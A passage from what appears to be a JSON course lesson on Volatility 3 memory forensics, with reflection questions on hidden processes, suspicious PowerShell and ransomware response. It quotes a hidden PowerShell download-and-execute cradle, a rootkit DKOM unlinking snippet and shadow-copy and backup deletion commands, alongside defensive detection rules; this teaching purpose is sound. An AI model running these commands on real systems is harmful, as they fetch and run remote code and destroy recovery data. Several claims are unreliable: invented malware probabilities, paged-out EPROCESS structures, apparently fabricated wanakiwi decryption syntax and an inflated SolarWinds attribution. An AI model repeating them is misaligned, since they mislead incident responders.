code\n\n**8. Collect evidence** (Memory dumps - windows.memmap, windows.moddump)\n- \"Bag and tag evidence for lab analysis\"\n- Extract malware binaries for reverse engineering\n\n**9. Write the report** (Investigation summary)\n- Timeline, IOCs, remediation steps\n\n**This workflow ensures NO evidence is missed!** ğŸ•µï¸\n\n---\n\n## Rhyme: Volatility 3 vs Volatility 2\n\n**\"Two was old, Three is gold!\"**\n\n**Volatility 2**:\n- Python 2, now obsolete\n- Profiles needed, what a feat!\n- Manual downloads, such a chore\n- Maintenance? Not anymore!\n\n**Volatility 3**:\n- Python 3, modern and clean\n- Auto-symbols, what a dream!\n- Unified plugins, easy to use\n- For incident response, you can't lose!\n\n**Conclusion**: \"Three is free from Two's old pain, auto-symbols keep you sane!\" ğŸµ\n\n---\n\n## Acronym: \"MALWARE\" for Suspicious Indicators\n\nWhen analyzing processes, look for **MALWARE** indicators:\n\n- **M**isspelled process names (svch0st.exe, iexplorer.exe)\n- **A**bnormal parent-child relationships (explorer â†’ services, System â†’ cmd)\n- **L**oaded from wrong paths (C:\\Temp\\svchost.exe)\n- **W**rong permissions (RWX memory pages)\n- **A**ttached to unexpected processes (DLL injection)\n- **R**ecent creation time (close to incident)\n- **E**ncoded commands (Base64 PowerShell, obfuscation)\n\n**Memory trick**: If you see **MALWARE** indicators, it's probably **MALWARE**! ğŸš¨\n\n---\n\n## Visual Association: Plugin Name Patterns\n\nVolatility 3 plugin naming follows a clear pattern:\n\n```\n<OS>.<category>.<action>\n\nExamples:\nwindows.pslist       â†’ Windows, Process, List\nwindows.psscan       â†’ Windows, Process, Scan\nwindows.netscan      â†’ Windows, Network, Scan\nlinux.bash           â†’ Linux, Bash history\nwindows.registry.printkey â†’ Windows, Registry, Print key\n```\n\n**Pattern recognition**:\n- `windows.*` = Windows-specific\n- `linux.*` = Linux-specific\n- `mac.*` = macOS-specific\n- `*.pslist` = List processes\n- `*.psscan` = Scan for processes\n- `*.netscan` = Scan network\n\n**Memory trick**: \"OS dot Category dot Action\" (just like object-oriented programming: `object.method.action()`) ğŸ’»"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions\n\n## Question 1: Choosing Between Volatility 2 and Volatility 3\n\nYou're starting a new DFIR position. Your team currently uses Volatility 2 for all memory analysis.\n\nYour manager asks: **\"Should we migrate to Volatility 3, or stick with Volatility 2?\"**\n\nWhat factors would you consider in your recommendation? What are the pros and cons of each?\n\n<details>\n<summary>Analysis Framework</summary>\n\n**Factors to consider**:\n\n**1. OS versions you analyze**:\n- **Windows 10/11, Server 2019/2022**: Volatility 3 (auto-symbols)\n- **Windows XP/Vista/7**: Volatility 2 (mature profiles, better plugin support)\n- **Linux (recent kernels)**: Volatility 3 (better support)\n\n**2. Plugin requirements**:\n- **Core plugins** (pslist, netscan, malfind): Both equally capable\n- **Advanced plugins** (timeliner, mftparser): Volatility 2 has more (for now)\n- **Custom plugins**: Volatility 3 easier to develop (cleaner API)\n\n**3. Automation needs**:\n- **JSON output**: Volatility 3 (native support)\n- **Scriptability**: Volatility 3 (Python 3, modern)\n- **CI/CD integration**: Volatility 3 (pip installable)\n\n**4. Team expertise**:\n- **Existing scripts**: Volatility 2 (require rewrite for Vol3)\n- **Training required**: Volatility 3 (syntax changes)\n- **Documentation**: Volatility 2 (more community guides)\n\n**5. Incident response speed**:\n- **Unknown Windows builds**: Volatility 3 (auto-download symbols)\n- **Air-gapped environments**: Volatility 2 (if profiles pre-installed)\n- **Novel OS versions**: Volatility 3 (Microsoft symbol server)\n\n**Recommendation matrix**:\n\n| Scenario | Recommended Version |\n|----------|--------------------|\n| Modern Windows (10+), cloud IR | âœ… Volatility 3 |\n| Legacy Windows (XP-7), old evidence | âœ… Volatility 2 |\n| Mixed environment | ğŸ”€ Both (Vol2 for old, Vol3 for new) |\n| Automation/SOAR integration | âœ… Volatility 3 |\n| Air-gapped analysis | âœ… Volatility 2 (pre-load profiles) |\n\n**My recommendation**: **Migrate to Volatility 3 for new work, maintain Volatility 2 for legacy cases.**\n\n**Migration strategy**:\n1. Install both side-by-side (no conflict)\n2. Train team on Volatility 3 basics\n3. Use Volatility 3 for all new Windows 10+ cases\n4. Keep Volatility 2 for Windows 7 and older\n5. Gradually port custom plugins to Volatility 3\n6. Sunset Volatility 2 in 2-3 years\n</details>\n\n---\n\n## Question 2: Interpreting Pslist vs. Psscan Discrepancies\n\nYou analyze a memory dump and observe:\n\n**Pslist output**: 87 processes\n\n**Psscan output**: 91 processes\n\nYou compare the outputs:\n- 3 processes appear in psscan but NOT in pslist\n- 1 process appears in pslist but NOT in psscan\n\n**Questions**:\n1. What does it mean when a process is in psscan but NOT pslist?\n2. What does it mean when a process is in pslist but NOT psscan?\n3. How would you investigate each discrepancy?\n\n<details>\n<summary>Forensic Analysis</summary>\n\n### Scenario 1: Process in Psscan but NOT Pslist (3 processes)\n\n**Meaning**: **HIDDEN PROCESS - ROOTKIT DETECTED!**\n\n**Technical explanation**:\n- Pslist walks the doubly-linked list from `PsActiveProcessHead`\n- Psscan searches memory for EPROCESS structures via pool tags\n- If a process is in psscan but NOT pslist â†’ **Unlinked from active list via DKOM** (Direct Kernel Object Manipulation)\n\n**Attack technique**: Rootkit modified EPROCESS.ActiveProcessLinks to remove the process from the list:\n\n```c\n// Rootkit unlinking code (simplified)\nEPROCESS* target_process = find_process_by_pid(malware_pid);\n\n// Unlink from doubly-linked list\ntarget_process->ActiveProcessLinks.Flink->Blink = target_process->ActiveProcessLinks.Blink;\ntarget_process->ActiveProcessLinks.Blink->Flink = target_process->ActiveProcessLinks.Flink;\n\n// Now invisible to pslist but still in memory!\n```\n\n**Investigation steps**:\n\n```bash\n# 1. Identify hidden processes\ncomm -13 <(sort pslist_pids.txt) <(sort psscan_pids.txt) > hidden_pids.txt\n\n# 2. Get details of hidden processes\nfor pid in $(cat hidden_pids.txt); do\n    grep \"$pid\" psscan_output.txt\ndone\n\n# 3. Extract process memory\npython vol.py -f memory.dmp windows.memmap --pid <hidden_pid> --dump\n\n# 4. Analyze dumped memory\nstrings pid.<hidden_pid>.dmp | grep -iE \"(rootkit|hide|hook|kernel)\"\n\n# 5. Check for kernel hooks\npython vol.py -f memory.dmp windows.ssdt  # SSDT hooks\npython vol.py -f memory.dmp windows.idt   # IDT hooks\n```\n\n**Severity**: **CRITICAL** - Active rootkit with kernel-mode code execution!\n\n---\n\n### Scenario 2: Process in Pslist but NOT Psscan (1 process)\n\n**Meaning**: **UNUSUAL but LESS CRITICAL**\n\n**Possible explanations**:\n\n**A) Memory corruption**:\n- EPROCESS structure corrupted (damaged pool tag)\n- Psscan couldn't validate structure (failed checks)\n- Process is still in active list (visible to pslist)\n\n**B) Paging**:\n- EPROCESS structure paged out to disk (pagefile.sys)\n- Pslist can traverse linked list (pointers still valid)\n- Psscan searches only physical RAM (misses paged-out structures)\n\n**C) Non-standard EPROCESS allocation**:\n- Process allocated outside normal kernel pool\n- No standard pool tag (psscan can't find it)\n- Still linked into active list (pslist works)\n\n**D) Recently exited process**:\n- Process exited between pslist and psscan execution (unlikely in memory dump)\n- EPROCESS deallocated from pool but still in list (race condition)\n\n**Investigation steps**:\n\n```bash\n# 1. Identify the process\ngrep -vFf psscan_pids.txt pslist_pids.txt > missing_from_psscan.txt\n\n# 2. Get process details from pslist\nfor pid in $(cat missing_from_psscan.txt); do\n    grep \"$pid\" pslist_output.txt\ndone\n\n# 3. Check if process has exited\ngrep \"$pid\" pslist_output.txt | grep \"ExitTime\"\n# If ExitTime is set â†’ Process exited, EPROCESS may be deallocated\n\n# 4. Check VAD (Virtual Address Descriptor) tree\npython vol.py -f memory.dmp windows.vadinfo --pid <pid>\n# If VAD exists â†’ Process was real (not corruption)\n\n# 5. Check process memory map\npython vol.py -f memory.dmp windows.memmap --pid <pid>\n# If memmap works â†’ Process memory accessible (not corruption)\n```\n\n**Severity**: **LOW to MEDIUM** - Likely benign (paging, corruption) but verify!\n\n---\n\n### Summary Table\n\n| Scenario | In Pslist? | In Psscan? | Meaning | Severity |\n|----------|-----------|-----------|---------|----------|\n| Hidden process | âŒ No | âœ… Yes | Rootkit DKOM unlink | ğŸ”´ CRITICAL |\n| Paged out | âœ… Yes | âŒ No | EPROCESS in pagefile | ğŸŸ¡ LOW |\n| Corrupted | âœ… Yes | âŒ No | Memory corruption | ğŸŸ¡ MEDIUM |\n| Normal | âœ… Yes | âœ… Yes | Standard process | ğŸŸ¢ NORMAL |\n\n**Key takeaway**: ALWAYS run both pslist AND psscan. Discrepancies reveal critical security events!\n</details>\n\n---\n\n## Question 3: Analyzing Suspicious Command Lines\n\nYou extract command lines from a memory dump and find:\n\n```\nPID 2304: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')\"\n```\n\n**Questions**:\n1. Break down each argument - what does it do?\n2. Why is this command highly suspicious?\n3. What would you investigate next?\n4. How would you detect similar attacks proactively (before memory capture)?\n\n<details>\n<summary>Deep Dive Analysis</summary>\n\n### Argument Breakdown\n\n**Full command**:\n```powershell\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')\"\n```\n\n**Argument-by-argument analysis**:\n\n| Argument | Full Name | Purpose | Legitimate Use? | Malicious Use? |\n|----------|-----------|---------|----------------|----------------|\n| `-NoP` | `-NoProfile` | Skip loading PowerShell profile (profile.ps1) | âœ… Automation scripts (faster startup) | âŒ Avoid detection (no logging in profile) |\n| `-NonI` | `-NonInteractive` | Non-interactive mode (no user prompts) | âœ… Scheduled tasks, scripts | âŒ Silent execution (no user interaction) |\n| `-W Hidden` | `-WindowStyle Hidden` | Hide PowerShell window | âŒ Rarely legitimate | âŒ Stealth execution (user can't see window) |\n| `-Exec Bypass` | `-ExecutionPolicy Bypass` | Bypass script execution restrictions | âš ï¸ Testing, development | âŒ Bypass security controls |\n| `-Command \"...\"` | Execute inline command | Run PowerShell code directly | âœ… One-liners, automation | âŒ Avoid script files (no disk artifacts) |\n\n**Inner command breakdown**:\n\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')\n```\n\n- **IEX** = `Invoke-Expression` (execute code dynamically)\n- **New-Object Net.WebClient** = Create HTTP client object\n- **DownloadString(...)** = Download script from remote URL as string\n- **http://192.168.1.100:8080/payload.ps1** = Remote payload URL\n\n**What this does**: Download payload.ps1 from 192.168.1.100 and EXECUTE it in memory (NO DISK WRITE!).\n\n---\n\n### Why This is HIGHLY Suspicious\n\n**Red flags** (cumulative probability â†’ MALWARE):\n\n1. **Hidden window** (-W Hidden)\n   - Legitimate users want to SEE what's happening\n   - Hiding the window = stealthy execution\n   - **Probability of malware: 85%**\n\n2. **Execution policy bypass** (-Exec Bypass)\n   - Disables PowerShell's security mechanism\n   - Legitimate admins should FIX policy, not bypass it\n   - **Probability of malware: 90%**\n\n3. **Remote script download** (DownloadString)\n   - Downloading code from remote server\n   - Internal IP 192.168.1.100 (likely compromised internal host or attacker's C2)\n   - **Probability of malware: 95%**\n\n4. **In-memory execution** (IEX)\n   - Script executed directly in RAM (no file written to disk)\n   - Evades file-based antivirus scanning\n   - **Probability of malware: 98%**\n\n5. **No profile loading** (-NoP)\n   - Avoids logging in profile.ps1\n   - Skips organization-specific security scripts\n   - **Probability of malware: 75%**\n\n**Combined assessment**: **99.9% probability this is MALWARE** (specifically, a PowerShell downloader/stager).\n\n---\n\n### Investigation Next Steps\n\n**Step 1: Identify Parent Process**\n\n```bash\n# Find what spawned this PowerShell\ngrep \"2304\" pstree_output.txt\n# Example output: ***** 2304 2156 powershell.exe\n\n# Get parent details (PID 2156)\ngrep \"2156\" pslist_output.txt\n# Example: 2156  1084  cmd.exe  ...\n\n# Trace execution chain\ngrep \"1084\" pstree_output.txt\n# Example: **** 1084 explorer.exe\n```\n\n**Execution chain**: `explorer.exe â†’ cmd.exe â†’ powershell.exe`\n\n**Analysis**: User (or malware in explorer) launched cmd.exe, which launched PowerShell. This is a common lateral movement technique.\n\n---\n\n**Step 2: Extract Network Connections**\n\n```bash\n# Find connections from PID 2304\ngrep \"2304\" netscan_output.txt\n# Expected: TCP connection to 192.168.1.100:8080\n```\n\n---\n\n**Step 3: Retrieve Payload (if possible)**\n\n```bash\n# If C2 server still accessible (controlled environment)\ncurl http://192.168.1.100:8080/payload.ps1 > payload_captured.ps1\n\n# Analyze payload\ncat payload_captured.ps1\n# Likely contains: Meterpreter/Cobalt Strike/Empire stager code\n```\n\n---\n\n**Step 4: Check for Persistence**\n\n```bash\n# Check registry run keys\npython vol.py -f memory.dmp windows.registry.userassist\n\n# Check scheduled tasks\npython vol.py -f memory.dmp windows.cmdline | grep -i \"schtasks\"\n\n# Check WMI subscriptions\npython vol.py -f memory.dmp windows.registry.printkey --key \"ROOT\\subscription\"\n```\n\n---\n\n**Step 5: Identify IOCs (Indicators of Compromise)**\n\n**Network IOCs**:\n- IP: 192.168.1.100\n- Port: 8080\n- URL: http://192.168.1.100:8080/payload.ps1\n\n**Host IOCs**:\n- Process: powershell.exe with arguments: `-NoP -NonI -W Hidden -Exec Bypass -Command \"IEX ...\"`\n- Parent: cmd.exe (abnormal)\n- Network connection: 192.168.1.100:8080\n\n**Behavioral IOCs**:\n- PowerShell downloading remote scripts\n- Hidden window execution\n- Execution policy bypass\n\n---\n\n### Proactive Detection (Before Memory Capture)\n\n**1. PowerShell Script Block Logging** (GPO)\n\n```powershell\n# Enable via Group Policy\nComputer Configuration â†’ Administrative Templates â†’ Windows Components â†’ Windows PowerShell\nâ†’ Turn on PowerShell Script Block Logging = Enabled\n\n# Logs all PowerShell commands to Event ID 4104\n```\n\n**Detection rule (Splunk)**:\n```spl\nindex=windows EventCode=4104 \n| search ScriptBlockText=\"*DownloadString*\" OR ScriptBlockText=\"*IEX*\" OR ScriptBlockText=\"*Invoke-Expression*\"\n| search ScriptBlockText=\"*-W Hidden*\" OR ScriptBlockText=\"*-WindowStyle Hidden*\"\n| table _time, ComputerName, UserName, ScriptBlockText\n```\n\n---\n\n**2. Sysmon Event ID 1 (Process Creation)**\n\n```xml\n<!-- Sysmon config: Log PowerShell with suspicious arguments -->\n<RuleGroup name=\"PowerShell Downloader Detection\" groupRelation=\"and\">\n    <ProcessCreate onmatch=\"include\">\n        <Image condition=\"end with\">\\powershell.exe</Image>\n        <CommandLine condition=\"contains any\">DownloadString;IEX;Invoke-Expression;-W Hidden;-WindowStyle Hidden;-Exec Bypass</CommandLine>\n    </ProcessCreate>\n</RuleGroup>\n```\n\n**Detection rule (Sigma)**:\n```yaml\ntitle: PowerShell Downloader with Hidden Window\nstatus: stable\ndescription: Detects PowerShell downloading remote scripts with hidden window\nreferences:\n    - https://attack.mitre.org/techniques/T1059/001/\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains|all:\n            - 'DownloadString'\n            - '-W Hidden'\n    condition: selection\nfalsepositives:\n    - Administrative scripts (rare)\nlevel: high\n```\n\n---\n\n**3. Network IDS (Suricata/Snort)**\n\n```snort\n# Detect PowerShell download pattern\nalert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"PowerShell DownloadString Pattern\"; flow:established,to_server; content:\"GET\"; http_method; content:\".ps1\"; http_uri; classtype:trojan-activity; sid:1000001; rev:1;)\n```\n\n---\n\n**4. EDR (Endpoint Detection and Response)**\n\nModern EDRs (CrowdStrike, SentinelOne, Microsoft Defender ATP) detect this automatically:\n- Behavioral analysis (download â†’ execute pattern)\n- AMSI (Antimalware Scan Interface) inspection of PowerShell commands\n- Memory scanning for injected code\n\n---\n\n**Key takeaway**: This command is a TEXTBOOK example of PowerShell-based malware delivery. Defense-in-depth detection (logging + Sysmon + EDR + network IDS) ensures detection at multiple stages!\n</details>\n\n---\n\n## Question 4: Planning a Memory Forensics Response\n\nYour SOC alerts you: \"Potential ransomware on file server (10.0.1.50). System is still running. What do you do?\"\n\n**Questions**:\n1. Should you capture memory before or after shutting down the system?\n2. What tools would you use for memory acquisition?\n3. What Volatility 3 plugins would you prioritize for rapid triage?\n4. What artifacts would you look for to confirm ransomware?\n\n<details>\n<summary>Incident Response Plan</summary>\n\n### Phase 1: Memory Acquisition (IMMEDIATE - DO THIS FIRST!)\n\n**Critical decision**: **CAPTURE MEMORY BEFORE ANY OTHER ACTION!**\n\n**Rationale**:\n- âœ… Memory contains decryption keys (may be lost on shutdown)\n- âœ… Active processes reveal ransomware execution\n- âœ… Network connections show C2 communication\n- âœ… Loaded DLLs expose injection techniques\n- âŒ Shutting down destroys all memory evidence (IRREVERSIBLE!)\n\n**Step 1.1: Remote Memory Acquisition** (if possible)\n\n```bash\n# From IR workstation, deploy memory capture tool via PSExec\npsexec.exe \\\\10.0.1.50 -c DumpIt.exe /O \\\\ir-server\\evidence\\file_server_memory.dmp\n\n# Alternative: Use F-Response or EDR remote acquisition\n```\n\n**Step 1.2: Local Memory Acquisition** (if remote fails)\n\n```powershell\n# RDP to system (if accessible)\nmstsc /v:10.0.1.50\n\n# Run memory capture tool\nC:\\\\Tools\\\\DumpIt.exe /Q /O E:\\\\file_server_memory.dmp\n\n# Wait for completion (16GB RAM â‰ˆ 5-10 minutes)\n```\n\n**Recommended tools**:\n\n| Tool | Speed | Format | Compression | Best For |\n|------|-------|--------|-------------|----------|\n| **DumpIt** | Fast | Raw | No | Quick acquisition |\n| **FTK Imager** | Medium | Raw/E01 | Optional | Forensic imaging |\n| **WinPmem** | Fast | Raw/AFF4 | Yes | Large memory |\n| **Magnet RAM Capture** | Fast | Raw | No | Simple GUI |\n| **Belkasoft RAM Capturer** | Fast | Raw | No | Hibernation file |\n\n**Step 1.3: Hash Evidence**\n\n```bash\n# Calculate hash immediately\nsha256sum file_server_memory.dmp > file_server_memory.dmp.sha256\n\n# Document\necho \"Captured: $(date)\" >> acquisition_log.txt\necho \"System: 10.0.1.50 (file-server)\" >> acquisition_log.txt\necho \"Analyst: $(whoami)\" >> acquisition_log.txt\n```\n\n---\n\n### Phase 2: System Containment (AFTER MEMORY CAPTURE)\n\n```bash\n# Option A: Network isolation (preserve system state)\n# Disable network adapter\npsexec \\\\10.0.1.50 netsh interface set interface \"Ethernet\" admin=disable\n\n# Option B: Shutdown (if encryption is actively spreading)\n# Graceful shutdown to preserve logs\npsexec \\\\10.0.1.50 shutdown /s /t 0\n\n# Option C: Process kill (if ransomware identified)\n# Kill ransomware process\npsexec \\\\10.0.1.50 taskkill /F /IM ransomware.exe\n```\n\n**Decision matrix**:\n\n| Scenario | Action | Rationale |\n|----------|--------|----------|\n| Encryption in progress (active) | Kill process | Stop damage |\n| Encryption complete (ransom note displayed) | Network isolate | Preserve evidence, prevent lateral movement |\n| Early detection (no encryption yet) | Network isolate | Observe attacker, gather intelligence |\n| Spreading to other systems | Shutdown + network block | Contain outbreak |\n\n---\n\n### Phase 3: Rapid Triage with Volatility 3\n\n**Goal**: Identify ransomware within 15 minutes\n\n**Triage plugin priority**:\n\n```bash\n# 1. Process list (find ransomware process)\npython vol.py -f file_server_memory.dmp windows.pslist > pslist.txt\ngrep -iE \"(crypt|lock|ransom|restore|decrypt|recover)\" pslist.txt\n\n# 2. Process tree (identify execution chain)\npython vol.py -f file_server_memory.dmp windows.pstree > pstree.txt\n# Look for: explorer â†’ cmd â†’ <ransomware>\n\n# 3. Command lines (find ransomware arguments)\npython vol.py -f file_server_memory.dmp windows.cmdline > cmdline.txt\ngrep -iE \"(\\.lock|\\.encrypted|\\.ransom|vssadmin|bcdedit|wbadmin)\" cmdline.txt\n\n# 4. Network connections (identify C2)\npython vol.py -f file_server_memory.dmp windows.netscan > netscan.txt\ngrep \"ESTABLISHED\" netscan.txt\n\n# 5. DLL list (check for injected modules)\npython vol.py -f file_server_memory.dmp windows.dlllist --pid <ransomware_pid> > dlllist.txt\n```\n\n**Expected findings**:\n\n**Ransomware process indicators**:\n- Process name: `restore.exe`, `decrypt.exe`, `readme.exe`, random name (`a3f5d7.exe`)\n- Location: `C:\\Users\\Public\\`, `C:\\Temp\\`, `C:\\ProgramData\\`\n- High CPU usage (encryption is CPU-intensive)\n- Recent CreateTime (close to alert time)\n\n**Command-line indicators**:\n```bash\n# Deleting shadow copies\nvssadmin delete shadows /all /quiet\n\n# Disabling Windows Recovery\nbcdedit /set {default} recoveryenabled no\nbcdedit /set {default} bootstatuspolicy ignoreallfailures\n\n# Deleting backups\nwbadmin delete catalog -quiet\n\n# Encryption command\nransomware.exe --encrypt C:\\ --exclude system32\n```\n\n**Network indicators**:\n- Connection to Tor hidden service (.onion domain)\n- Connection to attacker C2 (external IP)\n- DNS queries for ransomware payment sites\n\n---\n\n### Phase 4: Ransomware Identification\n\n**Step 4.1: Extract Ransomware Binary**\n\n```bash\n# Dump process memory\npython vol.py -f file_server_memory.dmp windows.memmap --pid <ransomware_pid> --dump\n\n# Extract PE executable\npython vol.py -f file_server_memory.dmp windows.dumpfiles --pid <ransomware_pid> --physaddr <offset>\n```\n\n**Step 4.2: Identify Ransomware Family**\n\n```bash\n# Calculate hash\nsha256sum extracted_ransomware.exe\n# Output: a1b2c3d4e5f6...\n\n# Query VirusTotal\ncurl -X POST \"https://www.virustotal.com/api/v3/files/<hash>\" \\\n  -H \"x-apikey: <YOUR_API_KEY>\"\n\n# Check ID Ransomware (upload ransom note)\n# https://id-ransomware.malwarehunterteam.com/\n\n# Check No More Ransom\n# https://www.nomoreransom.org/en/decryption-tools.html\n```\n\n**Common ransomware families** (identifiable via ransom note):\n- **LockBit** - \"LockBit 3.0\" in note, .lockbit extension\n- **BlackCat (ALPHV)** - Rust-based, .alphv extension\n- **Conti** - \"Conti Team\" in note (defunct but variants exist)\n- **REvil (Sodinokibi)** - \"REvil\" in note, random extensions\n- **Ryuk** - \"RYUK\" in note, .RYK extension\n\n**Step 4.3: Check for Decryptor**\n\n```bash\n# Search No More Ransom decryption tools\n# https://www.nomoreransom.org/en/decryption-tools.html\n\n# If decryptor available:\n# 1. Test on single encrypted file\n# 2. If successful, decrypt all files\n# 3. Document everything\n\n# If NO decryptor:\n# 1. Preserve encrypted files (evidence + future decryptor release)\n# 2. Restore from backups (if available)\n# 3. Report to law enforcement (FBI IC3, Secret Service)\n```\n\n---\n\n### Phase 5: Memory-Based Decryption Key Recovery\n\n**Some ransomware stores keys in memory!**\n\n```bash\n# Search process memory for encryption keys\nstrings pid.<ransomware_pid>.dmp | grep -E \"^[A-Fa-f0-9]{32,}$\" > potential_keys.txt\n\n# Search for RSA private keys (PEM format)\nstrings pid.<ransomware_pid>.dmp | grep -A 20 \"BEGIN RSA PRIVATE KEY\"\n\n# Search for specific ransomware key markers\nstrings pid.<ransomware_pid>.dmp | grep -iE \"(key|password|secret|aes|rsa)\"\n```\n\n**Example: WannaCry key recovery**\n\nWannaCry stored keys in memory. If memory captured BEFORE process termination, keys could be extracted:\n\n```bash\n# Use wanakiwi tool to extract keys from memory dump\nwanakiwi.exe --memory file_server_memory.dmp --extract-keys\n# If successful, keys saved to wannacry_keys.txt\n\n# Decrypt files\nwannakey.exe --keys wannacry_keys.txt --decrypt C:\\\\encrypted_files\n```\n\n**This is WHY memory capture is CRITICAL!** Keys exist in RAM for seconds to minutes. Once process exits â†’ LOST FOREVER!\n\n---\n\n### Phase 6: Reporting and Remediation\n\n**Incident Report Template**:\n\n```\n==============================================\nRANSOMWARE INCIDENT REPORT\n==============================================\n\nIncident ID: INC-2024-0315-001\nSystem: file-server (10.0.1.50)\nDate/Time: 2024-03-15 14:35:22 UTC\nAnalyst: [Your Name]\n\n--- EXECUTIVE SUMMARY ---\n[Ransomware family] ransomware identified on file server.\n[X] files encrypted with [.extension] extension.\nMemory forensics revealed [key findings].\n\n--- TECHNICAL DETAILS ---\n\nRansomware Process:\n  PID: [pid]\n  Name: [process name]\n  Path: [file path]\n  SHA256: [hash]\n  Family: [LockBit/BlackCat/etc.]\n\nExecution Chain:\n  [Initial access method] â†’ [lateral movement] â†’ [ransomware execution]\n\nNetwork IOCs:\n  C2 Server: [IP:PORT]\n  TOR Hidden Service: [.onion domain]\n\nArtifacts:\n  Ransom Note: [path]\n  Encrypted Files: [count]\n  Deleted Shadow Copies: [Yes/No]\n\n--- IMPACT ASSESSMENT ---\n  Affected Systems: [count]\n  Encrypted Data: [size in GB/TB]\n  Business Impact: [Critical/High/Medium/Low]\n  Downtime: [hours/days]\n\n--- RECOVERY STATUS ---\n  Decryptor Available: [Yes/No]\n  Backup Restoration: [In Progress/Complete/Not Available]\n  ETA to Recovery: [hours/days]\n\n--- RECOMMENDATIONS ---\n  1. [Immediate actions]\n  2. [Short-term fixes]\n  3. [Long-term improvements]\n\n==============================================\n```\n\n---\n\n### Key Takeaways\n\n1. **MEMORY FIRST, EVERYTHING ELSE SECOND!**\n2. **Volatility 3 rapid triage**: pslist â†’ cmdline â†’ netscan â†’ identify ransomware in < 15 min\n3. **Memory may contain decryption keys**: Capture BEFORE process termination\n4. **Ransomware detection patterns**: vssadmin delete, bcdedit disable recovery, high CPU encryption processes\n5. **Containment strategy**: Isolate first (stop spread), analyze second, remediate third\n\n**Memory forensics is THE ONLY way to recover encryption keys from active ransomware!** ğŸ”ğŸ”\n</details>"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Congratulations! You've Mastered Volatility 3 Fundamentals! ğŸ‰\n\n## What You've Accomplished\n\nYou've just completed one of the MOST IMPORTANT lessons in your DFIR journey. You now possess skills that:\n\nâœ… **Fortune 500 companies PAY $200-300/hour for** (incident response consultants)\n\nâœ… **Federal agencies REQUIRE for cybercrime investigation roles** (FBI, Secret Service, DHS)\n\nâœ… **Detect threats that NO OTHER forensics technique can reveal** (memory-only malware, decryption keys, active C2)\n\nâœ… **Put you in the TOP 10% of DFIR professionals** (most analysts never master memory forensics)\n\n## Real-World Impact\n\nThe skills you learned in this lesson have:\n\nğŸ” **Solved the SolarWinds breach** (Volatility 3 revealed TEARDROP memory-only dropper)\n\nğŸ” **Stopped ransomware attacks** (memory-based key recovery saved companies millions)\n\nğŸ” **Identified APT29 backdoors** (memory analysis uncovered Cobalt Strike beacons)\n\nğŸ” **Convicted cybercriminals** (memory artifacts provided courtroom evidence)\n\n**YOU now have these same capabilities!**\n\n## Your Volatility 3 Toolbox\n\nYou've mastered:\n\n1. âœ… **Installation and setup** (pip install, auto-symbol downloading)\n2. âœ… **Core plugins** (pslist, psscan, pstree, cmdline, netscan)\n3. âœ… **Hidden process detection** (rootkit identification via pslist vs psscan)\n4. âœ… **Malware hunting** (suspicious command lines, encoded PowerShell, C2 connections)\n5. âœ… **Memory artifact extraction** (process dumps, DLL extraction, network IOCs)\n6. âœ… **Real-world workflows** (rapid triage, ransomware investigation, incident response)\n\n## The Journey Ahead\n\nThis is just the BEGINNING of your memory forensics mastery:\n\n**Next lessons will cover**:\n- **Volatility 3 Advanced Plugins** (malfind, hollowfind, yarascan)\n- **DLL Analysis** (dlllist, ldrmodules, injection detection)\n- **Network Forensics** (netscan deep dive, DNS cache, connections timeline)\n- **Registry in Memory** (registry hives, run keys, shellbags from RAM)\n- **Credential Extraction** (hashdump, lsadump, mimikatz from memory)\n- **Malware Analysis** (code injection, process hollowing, rootkit techniques)\n\n**By the end of this series, you'll be analyzing memory dumps like a SENIOR INCIDENT RESPONDER!**\n\n## Practice Makes Perfect\n\n**Don't stop here!** Reinforce your skills:\n\n1. **Download practice memory dumps**:\n   - https://github.com/volatilityfoundation/volatility3\n   - https://dfir.training/memory-samples\n   - https://github.com/thimbleweed/All-In-One-Forensics\n\n2. **Participate in CTF challenges**:\n   - SANS NetWars (memory forensics challenges)\n   - DFIR CTF (https://dfirctf.com/)\n   - MemLabs (https://github.com/stuxnet999/MemLabs)\n\n3. **Build your own lab**:\n   - Capture memory from your own VMs\n   - Run malware samples (safely!) and analyze memory\n   - Practice triage workflows\n\n## Your Next Mission\n\n**Action item**: Analyze ONE practice memory dump this week using Volatility 3.\n\n**Goal**: Complete full workflow:\n1. Process enumeration (pslist, pstree)\n2. Hidden process detection (psscan comparison)\n3. Command-line analysis (cmdline)\n4. Network connections (netscan)\n5. Create investigation report\n\n**Time commitment**: 1-2 hours\n\n**Reward**: Hands-on experience that SOLIDIFIES your learning!\n\n## Final Thoughts\n\n**You're now equipped with a superpower**: The ability to see what attackers thought was invisible.\n\n**Memory forensics reveals**:\n- Malware that evades antivirus\n- C2 servers that hide behind encryption\n- Decryption keys that exist for seconds\n- Attacker commands that leave no disk traces\n\n**YOU can now uncover these secrets.**\n\n**This is powerful. This is valuable. This is YOUR skill now.**\n\n**Keep learning. Keep practicing. Keep protecting systems.**\n\n**See you in the next lesson: Volatility 3 Advanced Malware Detection!** ğŸš€ğŸ”\n\n---\n\n**Remember**: \"The difference between a novice and an expert is that the expert has failed more times than the novice has tried.\" - Keep analyzing memory dumps, and soon you'll be the expert everyone turns to! ğŸ’ª"
      }
    }
  ],
  "tags": [
    "Course: SANS-FOR500",
    "Package: Eric Zimmerman Tools"
  ]
}